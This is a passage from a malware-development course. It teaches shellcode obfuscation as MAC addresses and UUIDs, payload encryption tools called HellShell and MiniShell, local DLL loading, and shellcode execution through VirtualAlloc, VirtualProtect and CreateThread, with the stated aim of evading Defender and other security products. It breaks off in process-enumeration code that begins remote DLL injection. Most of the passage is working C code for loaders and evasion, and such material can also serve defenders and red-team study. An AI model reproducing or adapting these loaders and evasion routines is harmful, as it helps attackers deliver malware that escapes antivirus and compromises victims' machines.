The deobfuscation process will reverse the obfuscation process, allowing a MAC address to generate bytes instead of using bytes to generate a MAC address. Performing deobfuscation will require the use of the NTDLL API function??[RtlEthernetStringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetstringtoaddressa). This function converts a MAC address from a string representation to its binary format.

```c
typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
	PCSTR		S,
	PCSTR* 		Terminator,
	PVOID		Addr
);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer        = NULL,
                   TmpBuffer      = NULL;

	SIZE_T         sBuffSize      = NULL;

	PCSTR          Terminator     = NULL;

	NTSTATUS       STATUS         = NULL;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of MAC addresses * 6
	sBuffSize = NmbrOfElements * 6;


	// Allocating memeory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the MAC addresses saved in MacArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one MAC address at a time
		// MacArray[i] is a single Mac address from the array MacArray
		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
			return FALSE;
		}

		// 6 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 6 to store the
		TmpBuffer = (PBYTE)(TmpBuffer + 6);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress  = pBuffer;
	*pDSize      = sBuffSize;

	return TRUE;

}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/macfuscation.png)
# 3.1 Payload Obfuscation - UUIDFuscation

### Introduction

In this module, another obfuscation technique is covered which converts shellcode to a Universally Unique IDentifier (UUID) string. UUID is a 36-character alphanumeric string that can be used to identify information.

### UUID Structure

The UUID format is made up of 5 segments of different sizes which look something like this:??`801B18F0-8320-4ADA-BB13-41EA1C886B87`. The image below illustrates the UUID structure.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/uuid.png)

Converting UUID to shellcode is a little less straightforward than the previous obfuscation methods. For example??`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`??does??**not**??translate into??`FC4883E4-F0E8-C000-0000-415141505251`, instead, it becomes??`E48348FC-E8F0-00C0-0000-415141505251`.

Notice that the first 3 segments are using the same bytes in our shellcode but the order is in reverse. The reason is that the first three segments use??[little-endian](https://en.wikipedia.org/wiki/Endianness)??byte ordering. To ensure complete understanding, the segments are broken down below.

#### Little Endian

- Segment 1:??`FC 48 83 E4`??becomes??`E4 83 48 FC`??in the UUID string
    
- Segment 2:??`F0 E8`??becomes??`E8 F0`??in the UUID string
    
- Segment 3:??`C0 00`??becomes??`00 C0`??in the UUID string
    

#### Big Endian

- Segment 4:??`00 00`??becomes??`00 00`??in the UUID string
    
- Segment 5:??`41 51 41 50 52 51`??becomes??`41 51 41 50 52 51`??in the UUID string
    

### UUIDFuscation Implementation

A UUID address is made up of 16 bytes, therefore the shellcode should be a multiple of 16. UUIDFuscation will resemble IPv6Fuscation closely due to both requiring shellcode multiples of 16 bytes. Again, padding can be used if the shellcode doesn't meet that requirement.

```c
// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in a UUID (32 * 4 = 128)
	char result[128];

	// Generating output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generating output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);

	// Generating output2 from the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);

	// Generating output3 from the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	//printf("[i] result: %s\n", (char*)result);
	return (char*)result;
}



// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}
	printf("char* UuidArray[%d] = { \n\t", (int)(ShellcodeSize / 16));

	// We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* UUID = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
		if (c == 16) {
			counter++;

			// Generating the UUID string from 16 bytes which begin at i until [i + 15]
			UUID = GenerateUUid(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last UUID string
				printf("\"%s\"", UUID);
				break;
			}
			else {
				// Printing the UUID string
				printf("\"%s\", ", UUID);
			}
			c = 1;
			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}
```

#### UUID Deobfuscation Implementation

Although different segments have different endianness, that will not affect the deobfuscation process because the??[UuidFromStringA](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)??WinAPI takes care of this.

```c

typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID*		Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

        PBYTE          pBuffer         = NULL,
                       TmpBuffer       = NULL;

        SIZE_T         sBuffSize       = NULL;

        RPC_STATUS     STATUS          = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {
		
		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize     = sBuffSize;

	return TRUE;
}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/uuidfuscation.png)
# 3.2 Maldev Academy Tool - HellShell

### Introduction

At this point of the course, one should have a solid grasp of static evasion using encryption (XOR/RC4/AES) and obfuscation (IPv4/IPv6/MAC/UUID) techniques. Implementing one or more of the previously discussed evasion techniques in the malware can be time-consuming. One solution is to build a tool that takes in the payload and performs the encryption or obfuscation methods.

This module will demo a tool made by the Maldev Academy team that performs these tasks.

### Tool Features

The tool has the following features:

- Supports IPv4/IPv6/MAC/UUID Obfuscation
    
- Supports XOR/RC4/AES encryption
    
- Supports payload padding
    
- Provides the decryption function for the selected encryption/obfuscation technique
    
- Randomly generated encryption keys on every run
    

### Usage

To use HellShell, download the source code and compile it manually. Ensure the build option is set to??_Release_.

```c
                            ###########################################################
                            # HellShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #
                            ###########################################################

[!] Usage: HellShell.exe <Input Payload FileName> <Enc/Obf *Option*>
[i] Options Can Be :
        1.>>> "mac"     ::: Output The Shellcode As A Array Of Mac Addresses  [FC-48-83-E4-F0-E8]
        2.>>> "ipv4"    ::: Output The Shellcode As A Array Of Ipv4 Addresses [252.72.131.228]
        3.>>> "ipv6"    ::: Output The Shellcode As A Array Of Ipv6 Addresses [FC48:83E4:F0E8:C000:0000:4151:4150:5251]
        4.>>> "uuid"    ::: Output The Shellcode As A Array Of UUid Strings   [FC4883E4-F0E8-C000-0000-415141505251]
        5.>>> "aes"     ::: Output The Shellcode As A Array Of Aes Encrypted Shellcode With Random Key And Iv
        6.>>> "rc4"     ::: Output The Shellcode As A Array Of Rc4 Encrypted Shellcode With Random Key

```

### Example Commands

- `HellShell.exe calc.bin aes`??- Generates an AES encrypted payload and prints it to the console
    
- `HellShell.exe calc.bin aes > AesPayload.c`??- Generates an AES-encrypted payload and outputs it to??`AesPayload.c`
    
- `HellShell.exe calc.bin ipv6`??- Generates an IPv6 obfuscated payload and prints it to the console
    

### Demo

The image below shows HellShell being used to encrypt the payload using the RC4 encryption algorithm and outputting to a file.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/hellshell.png)
# 3.3 Maldev Academy Tool - MiniShell

### Introduction

This is another Maldev Academy tool, similar to??`HellShell`, which allows encryption of raw payloads. The tool only supports RC4 and AES.

### Features

- Outputs the decryption function of the selected encryption type
    
- Outputs the encrypted bytes as a??`bin`??file
    
- Randomly generated keys for the encryption algorithms
    

### Usage

```c
                         ###########################################################
                         # MiniShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #
                         ###########################################################

[!] Usage: C:\Users\User\source\repos\MiniShell\x64\Debug\MiniShell.exe <Input Payload FileName> <Enc *Option*>  <Output FileName>
[i] Encryption Options Can Be :
        1.>>> "aes"     ::: Output The File As A Encrypted File Using AES-256 Algorithm With Random Key And IV
        2.>>> "rc4"     ::: Output The File As A Encrypted File Using Rc4 Algorithm With Random Key
```

### Examples

- `.\MiniShell.exe .\calc.bin rc4 encpayload.bin`??- Use RC4 for encryption, write the encrypted bytes to??`encpayload.bin`, output the decryption functionality to the console
    
- `.\MiniShell.exe .\calc.bin rc4 encpayload.bin > rc4.c`??- Use RC4 for encryption, write the encrypted bytes to??`encpayload.bin`??- output the decryption function to??`rc4.c`.
    
- `.\MiniShell.exe .\calc.bin aes calcenc.bin`??- Use AES for encryption, write the encrypted bytes to??`calcenc.bin`, and output the decryption function to the console.
    
- `.\MiniShell.exe .\calc.bin aes calcenc.bin > aes.c`??- Use AES for encryption, write the encrypted bytes to??`calcenc.bin`, and output the decryption function to??`aes.c`.
    

### Demo

The image below shows??`MiniShell`??being used to encrypt the??`calc.bin`??file with the encrypted bytes being written to??`AesCalc.bin`??and the decryption function being saved to??`Aes.c`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/minishell-updated.png)
# 3.4 Local Payload Execution - DLL

### Introduction

This module explores the usage of Dynamic Link Libraries (DLLs) as payloads and demonstrates how to load a malicious DLL file in the current process.

### Creating a DLL

Creating a DLL is simple and can be done using Visual Studio. Create a new project, set the programming language to C++, and finally select Dynamic-Link Library (DLL). This will create a DLL skeleton code that will be modified throughout the remainder of this module. For a refresher as to how DLLs work, feel free to review the introductory DLL module.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-a-dll.png)

### DLL Setup

This demo will utilize a message box that appears when the DLL is successfully loaded. Creating a message box can be easily done with the??[MessageBox](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)??WinAPI. The code snippet below will run??`MsgBoxPayload`??whenever the DLL is loaded into a process. Note that the precompiled headers were removed from the project's C/C++ settings as shown in the introductory??_Dynamic-Link Library_??module.

```c
#include <Windows.h>
#include <stdio.h>

VOID MsgBoxPayload() {
    MessageBoxA(NULL, "Hacking With MaldevAcademy", "Wow !", MB_OK | MB_ICONINFORMATION);
}


BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

### Local Injection

Recall that the??`LoadLibrary`??WinAPI is used to load a DLL. The function takes a DLL path on disk and loads it into the address space of the calling process, which in our case will be the current process. Loading the DLL will run its entry point, and thus run the??`MsgBoxPayload`??function, making the message box appear. Although the concept is simple, it will become useful in later modules to understand more complex techniques.

The code below will take the DLL's name as a command line argument, load it using??`LoadLibraryA`, and perform some error checking to ensure the DLL loaded successfully.

```c
#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

	if (argc < 2){
		printf("[!] Missing Argument; Dll Payload To Run \n");
		return -1;
	}

	printf("[i] Injecting \"%s\" To The Local Process Of Pid: %d \n", argv[1], GetCurrentProcessId());
	
	
	printf("[+] Loading Dll... ");
	if (LoadLibraryA(argv[1]) == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE ! \n");

	
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

```

#### Output

As expected, the message box successfully appears after injecting the DLL.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dll-injection-execution.png)

### Process Analysis

To further verify that the DLL is loaded in the process, run Process Hacker, double-click the process which loaded the DLL and head to the "Modules" tab. The DLL's name should appear in the list of modules. Clicking on the DLL's name will retrieve additional information about it such as imports, whether it's signed and section names.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/task-manager-dll.png)
# 3.5 Local Payload Execution - Shellcode

### Introduction

This module will discuss one of the simplest ways to execute shellcode via the creation of a new thread. Although this technique is simple, it's crucial to understand how it works as it lays the groundwork for more advanced shellcode execution methods.

The method discussed in this module utilizes??`VirtualAlloc`,??`VirtualProtect`??and??`CreateThread`??Windows APIs. It's important to note that this method is by no means a stealthy technique and EDRs will almost certainly detect this simple shellcode execution technique. On the other hand, antiviruses can potentially be bypassed using this method with sufficient obfuscation.

### Required Windows APIs

A good starting point would be to have a look at the documentation for the Windows APIs that will be utilized:

- [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)??- Allocates memory which will be used to store the payload
    
- [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)??- Change the memory protection of the allocated memory to be executable in order to execute the payload.
    
- [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)??- Creates a new thread that runs the payloads
    

### Obfuscating Payload

The payload used in this module will be the Msfvenom generated x64 calc payload. To make the demo realistic, evading Defender will be attempted and therefore obfuscating or encrypting the payload will be necessary. HellShell, which was introduced in an earlier module, will be used to obfuscate the payload. Run the following command:

`HellShell.exe msfvenom.bin uuid`

The output should be saved to the??`UuidArray`??variable.

### Allocating Memory

[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)??is used to allocate memory of size??`sDeobfuscatedSize`. The size of??`sDeobfuscatedSize`??is determined by the??`UuidDeobfuscation`??function, which returns the total size of the deobfuscated payload.

The??`VirtualAlloc`??WinAPI function looks like the following based on its documentation

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
  [in]           DWORD  flAllocationType,   // The type of memory allocation
  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated
);
```

The type of memory allocation is specified as??`MEM_RESERVE | MEM_COMMIT`??which will reserve a range of pages in the virtual address space of the calling process and commit physical memory to those reserved pages, the combined flags are discussed separately as the following:

- `MEM_RESERVE`??is used to reserve a range of pages without actually committing physical memory.
    
- `MEM_COMMIT`??is used to commit a range of pages in the virtual address space of the process.
    

The last parameter of??`VirtualAlloc`??sets the permissions on the memory region. The easiest way would be to set the memory protection to??`PAGE_EXECUTE_READWRITE`??but that is generally an indicator of malicious activity for many security solutions. Therefore the memory protection is set to??`PAGE_READWRITE`??since at this point only writing the payload is required but executing it isn't. Finally,??`VirtualAlloc`??will return the base address of the allocated memory.

### Writing Payload To Memory

Next, the deobfuscated payload bytes are copied into the newly allocated memory region at??`pShellcodeAddress`??and then clean up??`pDeobfuscatedPayload`??by overwriting it with 0s.??`pDeobfuscatedPayload`??is the base address of a heap allocated by the??`UuidDeobfuscation`??function which returns the raw shellcode bytes. It has been overridden with zeroes since it is not required anymore and therefore this will reduce the possibility of security solutions finding the payload in memory.

### Modifying Memory Protection

Before the payload can be executed, the memory protection must be changed since at the moment only read/write is permitted.??`VirtualProtect`??is used to modify the memory protections and for the payload to execute it will need either??`PAGE_EXECUTE_READ`??or??`PAGE_EXECUTE_READWRITE`.

The??`VirtualProtect`??WinAPI function looks like the following based on its documentation

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // The base address of the memory region whose access protection is to be changed
  [in]  SIZE_T dwSize,          // The size of the region whose access protection attributes are to be changed, in bytes
  [in]  DWORD  flNewProtect,    // The new memory protection option
  [out] PDWORD lpflOldProtect   // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'
);
```

Although some shellcode does require??`PAGE_EXECUTE_READWRITE`, such as self-decrypting shellcode, the Msfvenom x64 calc shellcode does not need it but the code snippet below uses that memory protection.

### Payload Execution Via CreateThread

Finally, the payload is executed by creating a new thread using the??`CreateThread`??Windows API function and passing??`pShellcodeAddress`??which is the shellcode address.

The??`CreateThread`??WinAPI function looks like the following based on its documentation

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // Set to NULL - optional
  [in]            SIZE_T                  dwStackSize,           // Set to 0 - default
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // Pointer to a function to be executed by the thread, in our case its the base address of the payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // Pointer to a variable to be passed to the function executed (set to NULL - optional)
  [in]            DWORD                   dwCreationFlags,       // Set to 0 - default
  [out, optional] LPDWORD                 lpThreadId             // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   
);
```

### Payload Execution Via Function Pointer

Alternatively, there is a simpler way to run the shellcode without using the??`CreateThread`??Windows API. In the example below, the shellcode is casted to a??`VOID`??function pointer and the shellcode is executed as a function pointer. The code essentially jumps to the??`pShellcodeAddress`??address.

```c
    (*(VOID(*)()) pShellcodeAddress)();
```

That is equivalent to running the code below.

```c
    typedef VOID (WINAPI* fnShellcodefunc)();       // Defined before the main function
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();
```

### CreateThread vs Function Pointer Execution

Although it is possible to execute shellcode using the function pointer method, it's generally not recommended. The Msfvenom-generated shellcode terminates the calling thread after it's done executing. If the shellcode was executed using the function pointer method, then the calling thread will be the main thread and therefore the entire process will exit after the shellcode is finished executing.

Executing the shellcode in a new thread prevents this problem because if the shellcode is done executing, the new worker thread will be terminated rather than the main thread, preventing the whole process from termination.

### Waiting For Thread Execution

Executing the shellcode using a new thread without a short delay increases the likelihood of the main thread finishing execution before the worker thread that runs the shellcode has completed its execution, leading to the shellcode not running correctly. This scenario is illustrated in the code snippet below.

```c
int main(){
    
    // ...
    
    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode execution
    return 0; // The main thread is done executing before the thread running the shellcode
}
```

In the provided implementation,??`getchar()`??is used to pause the execution until the user provides input. In real implementations, a different approach should be used which utilizes the??[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)??WinAPI to wait for a specified time until the thread executes.

The snippet below uses??`WaitForSingleObject`??to wait for the newly created thread to finish executing for??`2000`??milliseconds before executing the remaining code.

```c
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// Remaining code

```

In the example below,??`WaitForSingleObject`??will wait forever for the new thread to finish executing.

```c
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINTE);

```

### Main Function

The main function uses??`UuidDeobfuscation`??to deobfuscate the payload, then allocates memory, copies the shellcode to the memory region and executes it.

```c
int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
```

### Deallocating Memory

[VirtualFree](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree)??is a WinAPI that is used to deallocate previously allocated memory. This function should only be called after the payload has fully finished execution otherwise it might free the payload's content and crash the process.

```c
BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
```

`VirtualFree`??takes the base address of the allocated memory to be freed (`lpAddress`), the size of the memory to free (`dwSize`) and the type of free operation (`dwFreeType`) which can be one of the following flags:

- `MEM_DECOMMIT`??- The??`VirtualFree`??call will release the physical memory without releasing the virtual address space that is linked to it. As a result, the virtual address space can still be used to allocate memory in the future, but the pages linked to it are no longer supported by physical memory.
    
- `MEM_RELEASE`??- Both the virtual address space and the physical memory associated with the virtual memory allocated, are freed. Note that according to Microsoft's documentation, when this flag is used the??`dwSize`??parameter must be 0.
    

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

First, verify the output of the??`UuidDeobfuscation`??function to ensure valid shellcode is being returned. The image below shows that the shellcode is being deobfuscated successfully.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-1.png)

  

The next step is to check that memory is being allocated using the??`VirtualAlloc`??Windows API. Again, looking at the memory map at the bottom left it shows that memory is allocated and was populated with zeroes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-2.png)

  

After the memory was successfully allocated, the deobfuscated payload is written to the memory buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-3.png)

  

Recall that??`pDeobfuscatedPayload`??was zeroed out to avoid having the deobfuscated payload in memory where it's not being used. The buffer should be zeroed out completely.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-4.png)

  

Finally, the shellcode is executed and as expected the calculator application appears.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-5.png)

  

The shellcode can be seen inside Process Hacker's memory tab. Notice how our allocated memory region has??`RWX`??memory protection which stands out and therefore is usually a malicious indicator.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-6.png)
# 3.6 Process Injection - DLL Injection

### Introduction

This module will demonstrate a similar method to the one that was previously shown with the local DLL injection except it will now be performed on a remote process.

### Enumerating Processes

Before being able to inject a DLL into a process, a target process must be chosen. Therefore the first step to remote process injection is usually to enumerate the running processes on the machine to know of potential target processes that can be injected. The process ID (or PID) is required to open a handle to the target process and allow the necessary work to be done on the target process.

This module creates a function that performs process enumeration to determine all the running processes. The function??`GetRemoteProcessHandle`??will be used to perform an enumeration of all running processes on the system, opening a handle to the target process and returning both PID and handle to the process.

### CreateToolhelp32Snapshot

The code snippet starts by using??[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)??with the??`TH32CS_SNAPPROCESS`??flag for its first parameter, which takes a snapshot of all processes running on the system at the moment the function is executed.

```c
// Takes a snapshot of the currently running processes 
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
```

### PROCESSENTRY32 Structure

Once the snapshot is taken,??[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)??is used to get information for the first process in the snapshot. For all the remaining processes in the snapshot,??[Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)??is used.

Microsoft's documentation states that both??`Process32First`??and??`Process32Next`??require a??[PROCESSENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)??structure to be passed in for their second parameter. After the struct is passed in, the functions will populate the struct with information about the process. The??`PROCESSENTRY32`??struct is shown below with comments beside the useful members of the struct that will be populated by these functions.

```c
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // The process ID
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // Process ID of the parent process
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // The name of the executable file for the process
} PROCESSENTRY32;
```

After??`Process32First`??or??`Process32Next`??populate the struct, the data can be extracted from the struct by using the dot operator. For example, to extract the PID use??`PROCESSENTRY32.th32ProcessID`.

### Process32First & Process32Next

As previously mentioned,??`Process32First`??is used to get information for the first process and??`Process32Next`??for all the remaining processes in the snapshot using a do-while loop. The process name that's being searched for,??`szProcessName`, is compared against the process name in the current loop iteration which is extracted from the populated structure,??`Proc.szExeFile`. If there is a match then the process ID is saved and a handle is opened for that process.

```c
// Retrieves information about the first process encountered in the snapshot.
if (!Process32First(hSnapShot, &Proc)) {
	printf("[!] Process32First Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}

do {
	// Use the dot operator to extract the process name from the populated struct
	// If the process name matches the process we're looking for
	if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
		// Use the dot operator to extract the process ID from the populated struct
		// Save the PID
		*dwProcessId  = Proc.th32ProcessID;
		// Open a handle to the process
		*hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
		if (*hProcess == NULL)
			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

		break; // Exit the loop
	}

// Retrieves information about the next process recorded the snapshot.
// While a process still remains in the snapshot, continue looping
} while (Process32Next(hSnapShot, &Proc));
```

### Process Enumeration - Code

```c
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

